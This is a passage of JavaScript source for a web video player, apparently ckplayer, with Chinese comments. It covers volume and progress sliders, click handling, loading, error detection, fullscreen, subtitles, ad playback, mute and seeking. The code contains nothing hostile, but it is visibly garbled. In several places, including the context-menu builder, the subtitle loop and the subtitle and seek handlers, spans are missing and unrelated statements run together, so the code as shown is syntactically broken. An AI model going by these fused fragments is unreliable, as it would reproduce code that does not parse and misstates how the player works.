volumeBOXY['y'] }; thisTemp.promptShow(false, promptObj); }; var volumeObj = { slider: this.CB['volumeBO'], follow: this.CB['volumeUp'], refer: this.CB['volumeBg'], grossValue: 'volume', pd: true, startFun: function(vol) {}, monitorFun: function(vol) { thisTemp.changeVolume(vol * 0.01, false, false); volumePrompt(vol); }, endFun: function(vol) {}, overFun: function(vol) { volumePrompt(vol); } }; this.slider(volumeObj); var volumeClickObj = { refer: this.CB['volumeBg'], grossValue: 'volume', fun: function(vol) { thisTemp.changeVolume(vol * 0.01, true, true); } }; this.progressClick(volumeClickObj); this.timeButtonMouseDown(); //用单击的函数来判断是否需要建立控制栏监听 //鼠标经过/离开音量调节框时的 var volumeBgMove = function(event) { var volumeBgXY = thisTemp.getCoor(thisTemp.CB['volumeBg']); var eventX = thisTemp.client(event)['x']; var eventVolume = parseInt((eventX - volumeBgXY['x']) * 100 / thisTemp.CB['volumeBg'].offsetWidth); var buttonPromptObj = { title: thisTemp.language['volume'] + eventVolume + '%', x: eventX, y: volumeBgXY['y'] }; thisTemp.promptShow(false, buttonPromptObj); }; this.addListenerInside('mousemove', volumeBgMove, this.CB['volumeBg']); this.addListenerInside('mouseout', promptHide, this.CB['volumeBg']); this.addListenerInside('mouseout', promptHide, this.CB['volumeBO']); //注册清晰度相关事件 this.addDefListener(); //注册倍速相关事件 this.addPlaybackrate(); //注册多字幕事件 this.addSubtitles(); }, /* 内部函数 注册单击视频动作 */ videoClick: function() { var thisTemp = this; var clearTimerClick = function() { if (thisTemp.timerClick != null) { if (thisTemp.timerClick.runing) { thisTemp.timerClick.stop(); } thisTemp.timerClick = null; } }; var timerClickFun = function() { clearTimerClick(); thisTemp.isClick = false; thisTemp.sendJS('videoClick',thisTemp.videoClickXy); if (thisTemp.adPlayerPlay) { var ad = thisTemp.getNowAdvertisements(); try { if (ad['link'] != '') { window.open(ad['link']); } thisTemp.ajaxSuccessNull(ad['clickMonitor']); } catch(event) {} } else { if (thisTemp.ckplayerConfig['config']['click']) { thisTemp.playOrPause(); } } }; clearTimerClick(); if (this.isClick) { this.isClick = false; thisTemp.sendJS('videoDoubleClick',thisTemp.videoClickXy); if (thisTemp.ckplayerConfig['config']['doubleClick']) { if (!this.full) { thisTemp.fullScreen(); } else { thisTemp.quitFullScreen(); } } } else { this.isClick = true; this.timerClick = new this.timer(300, timerClickFun, 1) //this.timerClick.start(); } }, /* 内部函数 注册鼠标经过进度滑块的事件 */ timeButtonMouseDown: function() { var thisTemp = this; var timePrompt = function(time) { if (isNaN(time)) { time = 0; } var timeButtonXY = thisTemp.getCoor(thisTemp.CB['timeButton']); var promptObj = { title: thisTemp.formatTime(time), x: timeButtonXY['x'] - thisTemp.pdCoor['x'] + thisTemp.CB['timeButton'].offsetWidth * 0.5, y: timeButtonXY['y'] - thisTemp.pdCoor['y'] }; thisTemp.promptShow(false, promptObj); }; var timeObj = { slider: this.CB['timeButton'], follow: this.CB['timeProgress'], refer: this.CB['timeBoBg'], grossValue: 'time', pd: false, startFun: function(time) { thisTemp.isTimeButtonMove = false; }, monitorFun: function(time) {}, endFun: function(time) { if (thisTemp.V) { if (thisTemp.V.duration > 0) { thisTemp.needSeek = 0; thisTemp.videoSeek(parseInt(time)); } } }, overFun: function(time) { timePrompt(time); } }; var timeClickObj = { refer: this.CB['timeBoBg'], grossValue: 'time', fun: function(time) { if (thisTemp.V) { if (thisTemp.V.duration > 0) { thisTemp.needSeek = 0; thisTemp.videoSeek(parseInt(time)); } } } }; var timeBoBgmousemove = function(event) { var timeBoBgXY = thisTemp.getCoor(thisTemp.CB['timeBoBg']); var eventX = thisTemp.client(event)['x']; var duration=thisTemp.V.duration; if (isNaN(duration) || parseInt(duration) < 0.2) { duration = thisTemp.vars['duration']; } if(thisTemp.vars['forceduration']>0){ duration=thisTemp.vars['forceduration']; } var eventTime = parseInt((eventX - timeBoBgXY['x']) * duration / thisTemp.CB['timeBoBg'].offsetWidth); var buttonPromptObj = { title: thisTemp.formatTime(eventTime), x: eventX, y: timeBoBgXY['y'] }; thisTemp.promptShow(false, buttonPromptObj); var def = false; if (!thisTemp.isUndefined(thisTemp.CB['definitionP'])) { if (thisTemp.css(thisTemp.CB['definitionP'], 'display') != 'block') { def = true; } } if (thisTemp.vars['preview'] != null && def) { buttonPromptObj['time'] = eventTime; thisTemp.preview(buttonPromptObj); } }; var promptHide = function(event) { thisTemp.promptShow(false); if (thisTemp.previewDiv != null) { thisTemp.css([thisTemp.previewDiv, thisTemp.previewTop], 'display', 'none'); } }; if (!this.vars['live']) { //如果不是直播 this.isTimeButtonDown = true; this.addListenerInside('mousemove', timeBoBgmousemove, this.CB['timeBoBg']); this.addListenerInside('mouseout', promptHide, this.CB['timeBoBg']); } else { this.isTimeButtonDown = false; timeObj['removeListenerInside'] = true; timeClickObj['removeListenerInside'] = true; } this.slider(timeObj); this.progressClick(timeClickObj); }, /* 内部函数 注册调节框上单击事件，包含音量调节框和播放时度调节框 */ progressClick: function(obj) { /* refer:参考对象 fun:返回函数 refer:参考元素，即背景 grossValue:调用的参考值类型 pd: */ //建立参考元素的mouseClick事件，用来做为鼠标在其上按下时触发的状态 var thisTemp = this; var referMouseClick = function(event) { var referX = thisTemp.client(event)['x'] - thisTemp.getCoor(obj['refer'])['x']; var rWidth = obj['refer'].offsetWidth; var grossValue = 0; if (obj['grossValue'] == 'volume') { grossValue = 100; } else { if (thisTemp.V) { grossValue = thisTemp.V.duration; if (isNaN(grossValue) || parseInt(grossValue) < 0.2) { grossValue = thisTemp.vars['duration']; } if(thisTemp.vars['forceduration']>0){ grossValue=thisTemp.vars['forceduration']; } } } var nowZ = parseInt(referX * grossValue / rWidth); if (obj['fun']) { if (obj['grossValue'] === 'time') { var sliderXY = thisTemp.getCoor(thisTemp.CB['timeButton']); sliderLeft = sliderXY['x']; if (!thisTemp.checkSlideLeft(referX, sliderLeft, rWidth)) { return; } var bimeButtonWB = thisTemp.CB['timeButton'].offsetWidth * 0.5; thisTemp.css(thisTemp.CB['timeButton'], 'left', (referX - bimeButtonWB) + 'px'); thisTemp.css(thisTemp.CB['timeProgress'], 'width', (referX) + 'px'); } obj['fun'](nowZ); } }; if (this.isUndefined(obj['removeListenerInside'])) { this.addListenerInside('click', referMouseClick, obj['refer']); } else { this.removeListenerInside('click', referMouseClick, obj['refer']); } }, /* 内部函数 共用的注册滑块事件 */ slider: function(obj) { /* obj={ slider:滑块元素 follow:跟随滑块的元素 refer:参考元素，即背景 grossValue:调用的参考值类型 startFun:开始调用的元素 monitorFun:监听函数 endFun:结束调用的函数 overFun:鼠标放上去后调用的函数 pd:是否需要修正 } */ var thisTemp = this; var clientX = 0, criterionWidth = 0, sliderLeft = 0, referLeft = 0; var value = 0; var calculation = function() { //根据滑块的left计算百分比 var sLeft = parseInt(thisTemp.css(obj['slider'], 'left')); var rWidth = obj['refer'].offsetWidth - obj['slider'].offsetWidth; var grossValue = 0; if (thisTemp.isUndefined(sLeft) || isNaN(sLeft)) { sLeft = 0; } if (obj['grossValue'] == 'volume') { grossValue = 100; } else { if (thisTemp.V) { grossValue = thisTemp.V.duration; } } return parseInt(sLeft * grossValue / rWidth); }; var mDown = function(event) { thisTemp.addListenerInside('mousemove', mMove, document); thisTemp.addListenerInside('mouseup', mUp, document); var referXY = thisTemp.getCoor(obj['refer']); var sliderXY = thisTemp.getCoor(obj['slider']); clientX = thisTemp.client(event)['x']; referLeft = referXY['x']; sliderLeft = sliderXY['x']; criterionWidth = clientX - sliderLeft; if (obj['startFun']) { obj['startFun'](calculation()); } }; var mMove = function(event) { clientX = thisTemp.client(event)['x']; var newX = clientX - criterionWidth - referLeft; if (newX < 0) { newX = 0; } if (newX > obj['refer'].offsetWidth - obj['slider'].offsetWidth) { newX = obj['refer'].offsetWidth - obj['slider'].offsetWidth; } if (obj['slider'] === thisTemp.CB['timeButton']) { if (!thisTemp.checkSlideLeft(newX, sliderLeft, obj['refer'].offsetWidth)) { return; } } thisTemp.css(obj['slider'], 'left', newX + 'px'); thisTemp.css(obj['follow'], 'width', (newX + obj['slider'].offsetWidth * 0.5) + 'px'); var nowZ = calculation(); if (obj['monitorFun']) { obj['monitorFun'](nowZ); } }; var mUp = function(event) { thisTemp.removeListenerInside('mousemove', mMove, document); thisTemp.removeListenerInside('mouseup', mUp, document); if (obj['endFun']) { obj['endFun'](calculation()); } }; var mOver = function(event) { if (obj['overFun']) { obj['overFun'](calculation()); } }; if (this.isUndefined(obj['removeListenerInside'])) { this.addListenerInside('mousedown', mDown, obj['slider']); this.addListenerInside('mouseover', mOver, obj['slider']); } else { this.removeListenerInside('mousedown', mDown, obj['slider']); this.removeListenerInside('mouseover', mOver, obj['slider']); } }, /* 内部函数 判断是否可以拖动进度按钮或点击进度栏 */ checkSlideLeft: function(newX, sliderLeft, refer) { var timeSA = this.ckplayerConfig['config']['timeScheduleAdjust']; switch (timeSA) { case 0: return false; break; case 2: if (newX < sliderLeft) { return false; } break; case 3: if (newX > sliderLeft) { return false; } break; case 4: if (!this.timeSliderLeftTemp) { this.timeSliderLeftTemp = sliderLeft / refer; } if (newX < this.timeSliderLeftTemp * refer) { return false; } break; case 5: if (!this.timeSliderLeftTemp) { this.timeSliderLeftTemp = sliderLeft / refer; } else { var timeSliderMax = sliderLeft / refer; if (timeSliderMax > this.timeSliderLeftTemp) { this.timeSliderLeftTemp = timeSliderMax; } } if (newX > this.timeSliderLeftTemp * refer) { return false; } break; default: return true; break; } return true; }, /* 内部函数 显示loading */ loadingStart: function(rot) { var thisTemp = this; if (this.isUndefined(rot)) { rot = true; } if (this.showFace) { this.css(thisTemp.CB['loading'], 'display', 'none'); } if (this.timerLoading != null) { if (this.timerLoading.runing) { this.timerLoading.stop(); } this.timerLoading = null; } var buffer = 0; var loadingFun = function() { var nowRotate = '0'; try { nowRotate = thisTemp.css(thisTemp.CB['loadingCanvas'], 'transform') || thisTemp.css(thisTemp.CB['loadingCanvas'], '-ms-transform') || thisTemp.css(thisTemp.CB['loadingCanvas'], '-moz-transform') || thisTemp.css(thisTemp.CB['loadingCanvas'], '-webkit-transform') || thisTemp.css(thisTemp.CB['loadingCanvas'], '-o-transform') || '0'; } catch(event) {} nowRotate = parseInt(nowRotate.replace('rotate(', '').replace('deg);', '')); nowRotate += 4; if (nowRotate > 360) { nowRotate = 0; } if (thisTemp.showFace) { thisTemp.css(thisTemp.CB['loadingCanvas'], { transform: 'rotate(' + nowRotate + 'deg)', msTransform: 'rotate(' + nowRotate + 'deg)', mozTransform: 'rotate(' + nowRotate + 'deg)', webkitTransform: 'rotate(' + nowRotate + 'deg)', oTransform: 'rotate(' + nowRotate + 'deg)' }); } buffer++; if (buffer >= 99) { buffer = 99; } thisTemp.sendJS('buffer', buffer); }; if (rot) { this.timerLoading = new this.timer(10, loadingFun); //this.timerLoading.start(); if (this.showFace) { this.css(thisTemp.CB['loading'], 'display', 'block'); } } else { thisTemp.sendJS('buffer', 100); } }, /* 内部函数 判断是否需要显示上一集和下一集 */ showFrontNext: function() { if (!this.showFace) { return; } if (this.vars['front']) { this.css([this.CB['front'], this.CB['frontLine']], 'display', 'block'); } else { this.css([this.CB['front'], this.CB['frontLine']], 'display', 'none'); } if (this.vars['next']) { this.css([this.CB['next'], this.CB['nextLine']], 'display', 'block'); } else { this.css([this.CB['next'], this.CB['nextLine']], 'display', 'none'); } }, /* 内部函数 显示提示语 */ promptShow: function(ele, data) { if (!this.showFace) { return; } var obj = {}; if (ele || data) { if (!this.isUndefined(data)) { obj = data; } else { var offsetCoor = this.getCoor(ele); obj = { title: this.getDataset(ele, 'title'), x: offsetCoor['x'] + ele.offsetWidth * 0.5, y: offsetCoor['y'] }; } this.CB['prompt'].innerHTML = obj['title']; this.css(this.CB['prompt'], 'display', 'block'); var promoptWidth = this.getStringLen(obj['title']) * 10; this.css(this.CB['promptBg'], 'width', promoptWidth + 'px'); this.css(this.CB['prompt'], 'width', promoptWidth + 'px'); promoptWidth += 10; var x = obj['x'] - (promoptWidth * 0.5); var y = this.PD.offsetHeight - obj['y'] + 8; if (x < 0) { x = 0; } if (x > this.PD.offsetWidth - promoptWidth) { x = this.PD.offsetWidth - promoptWidth; } this.css([this.CB['promptBg'], this.CB['prompt']], { display: 'block', left: x + 'px', bottom: y + 'px' }); } else { this.css([this.CB['promptBg'], this.CB['prompt']], { display: 'none' }); } }, /* 内部函数 监听错误 */ timerErrorFun: function() { var thisTemp = this; this.errorSend = false; var clearIntervalError = function(event) { if (thisTemp.timerError != null) { if (thisTemp.timerError.runing) { thisTemp.timerError.stop(); } thisTemp.timerError = null; } }; var errorFun = function(event) { clearIntervalError(); thisTemp.error = true; //提取错误播放地址 thisTemp.errorUrl = thisTemp.getVideoUrl(); //提取错误播放地址结束 if (!thisTemp.errorSend) { thisTemp.errorSend = true; thisTemp.sendJS('error'); } if (thisTemp.showFace) { thisTemp.css(thisTemp.CB['errorText'], 'display', 'block'); thisTemp.css(thisTemp.CB['pauseCenter'], 'display', 'none'); thisTemp.css(thisTemp.CB['loading'], 'display', 'none'); } thisTemp.V.removeAttribute('poster'); thisTemp.resetPlayer(); }; var errorListenerFun = function(event) { setTimeout(function() { if (isNaN(thisTemp.V.duration)) { errorFun(event); } }, 500); }; if (!this.errorAdd) { this.errorAdd = true; this.addListenerInside('error', errorListenerFun, this.V); } clearIntervalError(); var timerErrorFun = function() { if (thisTemp.V && parseInt(thisTemp.V.networkState) == 3) { errorFun(); } }; this.timerError = new this.timer(this.config['errorTime'], timerErrorFun); //this.timerError.start(); }, /* 内部函数 构建判断全屏还是非全屏的判断 */ judgeFullScreen: function() { var thisTemp = this; if (this.timerFull != null) { if (this.timerFull.runing) { this.timerFull.stop(); } this.timerFull = null; } var fullFun = function() { thisTemp.isFullScreen(); }; this.timerFull = new this.timer(20, fullFun); }, /* 内部函数 判断是否是全屏 */ isFullScreen: function() { if (!this.showFace) { return; } var fullState = document.fullScreen || document.mozFullScreen || document.webkitIsFullScreen || document.msFullscreenElement; if (fullState && !this.full) { this.full = true; this.sendJS('full', true); this.elementCoordinate(); this.css(this.CB['full'], 'display', 'none'); this.css(this.CB['escFull'], 'display', 'block'); if (this.vars['live'] == 0) { this.timeUpdateHandler(); } this.PD.appendChild(this.CB['menu']); } if (!fullState && this.full) { this.full = false; this.sendJS('full', false); this.elementCoordinate(); this.css(this.CB['full'], 'display', 'block'); this.css(this.CB['escFull'], 'display', 'none'); if (this.timerFull != null) { if (this.timerFull.runing) { this.timerFull.stop(); } this.timerFull = null; } if (this.vars['live'] == 0) { this.timeUpdateHandler(); } this.body.appendChild(this.CB['menu']); } }, /* 内部函数 构建右键内容及注册相关动作事件 */ newMenu: function() { var thisTemp = this; var i = 0; this.css(this.CB['menu'], { backgroundColor: '#FFFFFF', padding: '5px', position: 'absolute', left: '10px', top: '20px', display: 'none', zIndex: '999', color: '#A1A9BE', boxShadow: '2px 2px 3px #AAAAAA' }); var mArr = this.contextMenu; var cMenu = this.ckplayerConfig['menu']; if (cMenu['name']) { if (cMenu['link']) { mArr[0] = [cMenu['name'], 'link', cMenu['link']]; } else { mArr[0] = [cMenu['name'], 'default']; } } if (cMenu['version']) { mArr[1] = [cMenu['version'], 'default', 'line']; } if (cMenu['more']) { if (typeof(cMenu['more']) == 'object') { if (cMenu['more'].length > 0) { var moreArr = cMenu['more']; for (i = 0; i < moreArr.length; i++) { var mTemp = moreArr[i]; var arrTemp = []; if (mTemp['name']) { arrTemp.push(mTemp['name']); } if (mTemp['clickEvent'] && mTemp['clickEvent'] != 'none') { var eveObj = this.clickEvent(mTemp['clickEvent']); arrTemp.push(eveObj['type']); if (eveObj['fun']) { arrTemp.push(eveObj['fun']); } if (eveObj['link']) { arrTemp.push(eveObj['link']); } if (eveObj['target']) { arrTemp.push(' target=\"' + eveObj['target'] + '\"'); } } if (mTemp['separatorBefore']) { arrTemp.push('line'); } mArr.push(arrTemp); } } } } var html = ''; for (i = 0; i < mArr.length; i++) { var me = mArr[i]; switch (me[1]) { case 'default': html += '' + me[0] + ''; break; case 'link': if (me[3]) { me[3] = 'target=\"' + me[3] + '\"'; } html += ' 0) { this.animatePause('pause'); } if (this.playerType == 'html5video' && this.V != null && this.config['videoDrawImage']) { this.stopVCanvas(); } if (!this.isUndefined(this.advertisements['pause']) && !this.adPlayStart && !this.adPauseShow) { //如果存在暂停广告 setTimeout(function() { if (!thisTemp.isUndefined(thisTemp.advertisements['pause']) && !thisTemp.adPlayStart && !thisTemp.adPauseShow && thisTemp.time > 1) { //如果存在暂停广告 thisTemp.adPausePlayer(); } }, 300); } }, /* 内部函数 停止画布 */ stopVCanvas: function() { if (this.timerVCanvas != null) { this.css(this.V, 'display', 'block'); this.css(this.MD, 'display', 'none'); if (this.timerVCanvas.runing) { this.timerVCanvas.stop(); } this.timerVCanvas = null; } }, /* 内部函数 根据当前播放还是暂停确认图标显示 */ playShow: function(b) { if (!this.showFace) { return; } if (b) { this.css(this.CB['play'], 'display', 'none'); this.css(this.CB['pauseCenter'], 'display', 'none'); this.css(this.CB['pause'], 'display', 'block'); } else { this.css(this.CB['play'], 'display', 'block'); if (this.css(this.CB['errorText'], 'display') == 'none') { if (!this.adPlayerPlay) { this.css(this.CB['pauseCenter'], 'display', 'block'); } } else { this.css(this.CB['pauseCenter'], 'display', 'none'); } this.css(this.CB['pause'], 'display', 'none'); } }, /* 内部函数 监听seek结束 */ seekedHandler: function() { this.resetTrack(); this.isTimeButtonMove = true; if (this.V.paused) { if(this.hlsAutoPlay){ this.videoPlay(); } else{ this.hlsAutoPlay=true; } } }, /* 内部函数 监听播放结束 */ endedHandler: function() { if (this.adPlayerPlay) { this.adI++; this.advertisementsPlay(); return; } if (!this.endAdPlay && !this.isUndefined(this.advertisements['end'])) { this.endAdPlay = true; this.adI = 0; this.adType = 'end'; this.adMuteInto(); this.adIsVideoTime = true; this.adPlayStart = true; this.adVideoPlay = false; this.videoPause(); this.advertisementsTime(); this.advertisementsPlay(); this.adSkipButtonShow(); this.adReset = true; return; } this.sendJS('ended'); this.endedAdReset(); if (this.vars['loop']) { this.videoSeek(0); } }, /* 重置结束后相关的设置 */ endedAdReset: function() { var arr = []; var i = 0; if (!this.isUndefined(this.advertisements['insertPlay'])) { arr = this.advertisements['insertPlay']; for (i = 0; i < arr.length; i++) { this.advertisements['insertPlay'][i] = false; } } if (!this.isUndefined(this.advertisements['otherPlay'])) { arr = this.advertisements['otherPlay']; for (i = 0; i < arr.length; i++) { this.advertisements['otherPlay'][i] = false; } } //this.endAdPlay=false; }, /* 内部函数 监听音量改变 */ volumechangeHandler: function() { if (!this.showFace) { return; } if ((this.ckplayerConfig['config']['mobileVolumeBarShow'] || !this.isMobile()) && this.css(this.CB['volume'], 'display') != 'none') { try { var volume=this.volume || this.V.volume; if (volume > 0) { this.css(this.CB['mute'], 'display', 'block'); this.css(this.CB['escMute'], 'display', 'none'); } else { this.css(this.CB['mute'], 'display', 'none'); this.css(this.CB['escMute'], 'display', 'block'); } } catch(event) {} } }, /* 内部函数 监听播放时间调节进度条 */ timeUpdateHandler: function() { var duration = 0; if (this.playerType == 'html5video') { try { duration = this.V.duration; } catch(event) {} } if (isNaN(duration) || parseInt(duration) < 0.2) { duration = this.vars['duration']; } if(this.vars['forceduration']>0){ duration=this.vars['forceduration']; } if (duration > 0) { this.time = this.V.currentTime; this.timeTextHandler(); this.trackShowHandler(); if (this.isTimeButtonMove) { this.timeProgress(this.time, duration); } } }, /* 内部函数 按时间改变进度条 */ timeProgress: function(time, duration) { if (!this.showFace) { return; } var timeProgressBgW = this.CB['timeProgressBg'].offsetWidth; var timeBOW = parseInt((time * timeProgressBgW / duration) - (this.CB['timeButton'].offsetWidth * 0.5)); if (timeBOW > timeProgressBgW - this.CB['timeButton'].offsetWidth) { timeBOW = timeProgressBgW - this.CB['timeButton'].offsetWidth; } if (timeBOW < 0) { timeBOW = 0; } this.css(this.CB['timeProgress'], 'width', timeBOW + 'px'); this.css(this.CB['timeButton'], 'left', parseInt(timeBOW) + 'px'); }, /* 内部函数 监听播放时间改变时间显示文本框 */ timeTextHandler: function() { //显示时间/总时间 if (!this.showFace) { return; } var duration = this.V.duration; var time = this.V.currentTime; if (isNaN(duration) || parseInt(duration) < 0.2) { duration = this.vars['duration']; } if(this.vars['forceduration']>0){ duration=this.vars['forceduration']; } this.CB['timeText'].innerHTML = this.formatTime(time) + ' / ' + this.formatTime(duration); if (this.CB['timeText'].offsetWidth > 0) { this.buttonWidth['timeText'] = this.CB['timeText'].offsetWidth; } }, /* 内部函数 监听是否是缓冲状态 */ bufferEdHandler: function() { if (!this.showFace || this.playerType == 'flashplayer') { return; } var thisTemp = this; var clearTimerBuffer = function() { if (thisTemp.timerBuffer != null) { if (thisTemp.timerBuffer.runing) { thisTemp.sendJS('buffer', 100); thisTemp.timerBuffer.stop(); } thisTemp.timerBuffer = null; } }; clearTimerBuffer(); var bufferFun = function() { if (!thisTemp.isUndefined(thisTemp.V) && thisTemp.V.buffered.length > 0) { var duration = thisTemp.V.duration; var len = thisTemp.V.buffered.length; var bufferStart = thisTemp.V.buffered.start(len - 1); var bufferEnd = thisTemp.V.buffered.end(len - 1); var loadTime = bufferStart + bufferEnd; var loadProgressBgW = thisTemp.CB['timeProgressBg'].offsetWidth; var timeButtonW = thisTemp.CB['timeButton'].offsetWidth; var loadW = parseInt((loadTime * loadProgressBgW / duration) + timeButtonW); if (loadW >= loadProgressBgW) { loadW = loadProgressBgW; clearTimerBuffer(); } thisTemp.changeLoad(loadTime); } }; this.timerBuffer = new this.timer(200, bufferFun); }, /* 内部函数 单独计算加载进度 */ changeLoad: function(loadTime) { if (this.V == null) { return; } if (!this.showFace) { return; } var loadProgressBgW = this.CB['timeProgressBg'].offsetWidth; var timeButtonW = this.CB['timeButton'].offsetWidth; var duration = this.V.duration; if (isNaN(duration) || parseInt(duration) < 0.2) { duration = this.vars['duration']; } if(this.vars['forceduration']>0){ duration=this.vars['forceduration']; } if (this.isUndefined(loadTime)) { loadTime = this.loadTime; } else { this.loadTime = loadTime; } var loadW = parseInt((loadTime * loadProgressBgW / duration) + timeButtonW); this.css(this.CB['loadProgress'], 'width', loadW + 'px'); this.sendJS('loadTime',loadTime); this.loadTimeTemp=loadTime; }, /* 内部函数 判断是否是直播 */ judgeIsLive: function() { var thisTemp = this; if (this.timerError != null) { if (this.timerError.runing) { this.timerError.stop(); } this.timerError = null; } this.error = false; if (this.showFace) { this.css(this.CB['errorText'], 'display', 'none'); } var timeupdate = function(event) { thisTemp.timeUpdateHandler(); }; if (!this.vars['live']) { if (this.V != null && this.playerType == 'html5video') { this.addListenerInside('timeupdate', timeupdate); thisTemp.timeTextHandler(); thisTemp.prompt(); //添加提示点 setTimeout(function() { thisTemp.bufferEdHandler(); }, 200); } } else { this.removeListenerInside('timeupdate', timeupdate); if (this.timerTime != null) { window.clearInterval(this.timerTime); timerTime = null; } if (this.timerTime != null) { if (this.timerTime.runing) { this.timerTime.stop(); } this.timerTime = null; } var timeFun = function() { if (thisTemp.V != null && !thisTemp.V.paused && thisTemp.showFace) { thisTemp.CB['timeText'].innerHTML = thisTemp.getNowDate(); } }; this.timerTime = new this.timer(1000, timeFun); //timerTime.start(); } this.definition(); }, /* 内部函数 加载字幕 */ loadTrack: function(def) { if (this.playerType == 'flashplayer' || this.vars['flashplayer'] == true) { return; } if(this.isUndefined(def)){ def=-1; } var track = this.vars['cktrack']; var loadTrackUrl=''; var type=this.typeString(track); var thisTemp = this; if(type=='array'){ if(def==-1){ var index=0; var indexN=0; for(var i=0;iindexN){ indexN=li[2]; index=i; } } } else{ index=def; } loadTrackUrl=track[index][0]; } else{ loadTrackUrl=track; } var obj = { method: 'get', dataType: 'text', url: loadTrackUrl, charset: 'utf-8', success: function(data) { if(data){ thisTemp.track = thisTemp.parseSrtSubtitles(data); thisTemp.trackIndex = 0; thisTemp.nowTrackShow = { sn: '' } } } }; this.ajax(obj); }, /* 内部函数 重置字幕 */ resetTrack: function() { this.trackIndex = 0; this.nowTrackShow = { sn: '' }; }, /* 内部函数 根据时间改变读取显示字幕 */ trackShowHandler: function() { if (!this.showFace || this.adPlayerPlay) { return; } if (this.track.length < 1) { return; } if (this.trackIndex >= this.track.length) { this.trackIndex = 0; } var nowTrack = this.track[this.trackIndex]; //当前编号对应的字幕内容 /* this.nowTrackShow=当前显示在界面上的内容 如果当前时间正好在nowTrack时间内，则需要判断 */ if (this.time >= nowTrack['startTime'] && this.time 0 && time > duration) { if(this.vars['forceduration']>0){ time=0; this.sendJS('ended'); } else{ time = duration-0.1; } } if (time >= 0) { this.V.currentTime = time; this.sendJS('seekTime', time); } }, /* 接口函数 调节音量/获取音量 */ changeVolume: function(vol, bg, button) { if (this.loaded) { if (this.playerType == 'flashplayer') { this.V.changeVolume(vol); return; } } if (isNaN(vol) || this.isUndefined(vol)) { vol = 0; } if (!this.loaded) { this.vars['volume'] = vol; } if (!this.html5Video) { this.V.changeVolume(vol); return; } try { if (this.isUndefined(bg)) { bg = true; } } catch(e) {} try { if (this.isUndefined(button)) { button = true; } } catch(e) {} if (!vol) { vol = 0; } if (vol < 0) { vol = 0; } if (vol > 1) { vol = 1; } try { this.V.volume = vol; } catch(error) {} this.volume = vol; if (bg && this.showFace) { var bgW = vol * this.CB['volumeBg'].offsetWidth; if (bgW < 0) { bgW = 0; } if (bgW > this.CB['volumeBg'].offsetWidth) { bgW = this.CB['volumeBg'].offsetWidth; } this.css(this.CB['volumeUp'], 'width', bgW + 'px'); } if (button && this.showFace) { var buLeft = parseInt(this.CB['volumeUp'].offsetWidth - (this.CB['volumeBO'].offsetWidth * 0.5)); if (buLeft > this.CB['volumeBg'].offsetWidth - this.CB['volumeBO'].offsetWidth) { buLeft = this.CB['volumeBg'].offsetWidth - this.CB['volumeBO'].offsetWidth } if (buLeft < 0) { buLeft = 0; } this.css(this.CB['volumeBO'], 'left', buLeft + 'px'); } }, /* 接口函数 静音 */ videoMute: function() { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.videoMute(); return; } this.volumeTemp = this.V ? (this.V.volume > 0 ? this.V.volume: this.vars['volume']) : this.vars['volume']; this.changeVolume(0); }, /* 接口函数 取消静音 */ videoEscMute: function() { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.videoEscMute(); return; } this.changeVolume(this.volumeTemp > 0 ? this.volumeTemp: this.vars['volume']); }, /* 接口函数 视频广告静音 */ adMuteFunction: function() { if (!this.loaded) { return; } this.changeVolume(0); this.adVideoMute = true; this.css(this.CB['adEscMute'], 'display', 'block'); this.css(this.CB['adMute'], 'display', 'none'); }, /* 接口函数 视频广告取消静音 */ adEscMuteFunction: function() { if (!this.loaded) { return; } var v = this.ckplayerConfig['style']['advertisement']['videoVolume']; this.changeVolume(v); this.adMuteInto(); }, /* 初始化广告的音量按钮 */ adMuteInto: function() { this.adVideoMute = false; this.css(this.CB['adEscMute'], 'display', 'none'); this.css(this.CB['adMute'], 'display', 'block'); }, /* 接口函数 快退 */ fastBack: function() { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.fastBack(); return; } var time = this.time - this.ckplayerConfig['config']['timeJump']; if (time < 0) { time = 0; } this.videoSeek(time); }, /* 接口函数 快进 */ fastNext: function() { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.fastNext(); return; } var time = this.time + this.ckplayerConfig['config']['timeJump']; if (time > this.V.duration) { time = this.V.duration; } this.videoSeek(time); }, /* 接口函数 获取当前播放的地址 */ getCurrentSrc: function() { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { return this.V.getCurrentSrc(); } return this.V.currentSrc; }, /* 内置函数 全屏/退出全屏动作，该动作只能是用户操作才可以触发，比如用户点击按钮触发该事件 */ switchFull: function() { if (this.full) { this.quitFullScreen(); } else { this.fullScreen(); } }, /* 内置函数 全屏动作，该动作只能是用户操作才可以触发，比如用户点击按钮触发该事件 */ fullScreen: function() { if (this.html5Video && this.playerType == 'html5video') { var element = this.PD; if (element.requestFullscreen) { element.requestFullscreen(); } else if (element.mozRequestFullScreen) { element.mozRequestFullScreen(); } else if (element.webkitRequestFullscreen) { element.webkitRequestFullscreen(); } else if (element.msRequestFullscreen) { element.msRequestFullscreen(); } else if (element.oRequestFullscreen) { element.oRequestFullscreen(); } this.judgeFullScreen(); } else { //this.V.fullScreen(); } }, /* 接口函数 退出全屏动作 */ quitFullScreen: function() { if (this.html5Video && this.playerType == 'html5video') { if (document.exitFullscreen) { document.exitFullscreen(); } else if (document.msExitFullscreen) { document.msExitFullscreen(); } else if (document.mozCancelFullScreen) { document.mozCancelFullScreen(); } else if (document.oRequestFullscreen) { document.oCancelFullScreen(); } else if (document.requestFullscreen) { document.requestFullscreen(); } else if (document.webkitExitFullscreen) { document.webkitExitFullscreen(); } else { this.css(document.documentElement, 'cssText', ''); this.css(document.document.body, 'cssText', ''); this.css(this.PD, 'cssText', ''); } this.judgeFullScreen(); } }, /* 下面列出只有flashplayer里支持的 */ videoRotation: function(n) { if (!this.loaded) { return; } if (this.playerType == 'flashplayer') { this.V.videoRotation(n); return; } if (this.isUndefined(n)) { n = 0; } var tf = this.css(this.V, 'transform'); if (this.isUndefined(tf) && !tf) { tf = 'rotate(0deg)'; } var reg = tf.match(/rotate\\([^)]+\\)/); reg = reg ? reg[0].replace('rotate(', '').replace('deg)', '') : ''; if (reg == '') { reg = 0; } else { reg = parseInt(reg); } if (n == -1) { reg -= 90; } else if (n == 1) { reg += 90; } else { if (n != 90 && n != 180 && n != 270 && n != -90 && n != -180 && n != -270) { reg = 0; } else { reg = n; } } n = reg; var y90 = n % 90, y180 = n % 180, y270 = n % 270; var ys = false; if (y90 == 0 && y180 == 